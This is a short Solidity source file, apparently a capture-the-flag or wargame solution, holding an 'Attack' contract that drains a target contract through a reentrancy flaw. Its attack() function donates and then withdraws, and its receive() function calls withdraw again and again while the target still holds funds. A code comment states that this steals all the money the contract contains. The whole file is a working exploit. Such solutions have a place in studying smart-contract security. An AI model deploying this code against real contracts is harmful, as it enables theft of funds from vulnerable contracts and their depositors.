
// SPDX-License-Identifier: MIT
//0x7850972037169685057f76146F22165eA45b047d
pragma solidity ^ 0.8.19;

interface Ireentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    
}

contract Attack{
Ireentrance reentrance;

constructor(address _target){
    reentrance = Ireentrance(_target);
}

function attack() external payable{
    reentrance.donate{value:msg.value}(address(this));
    reentrance.withdraw(msg.value);
}  
/*
When the contract receives money, the recaive function is called before 
updating the balances in the mapping, the withdraw function is called again
without reducing balance mapping for msg.sender, allowing us to steal all the money the
contract contains. 
*/
receive()external payable{
    uint targetbalance = address(reentrance).balance;
    if(targetbalance >= 0.001 ether){
    reentrance.withdraw(0.001 ether);
    }
    
}

}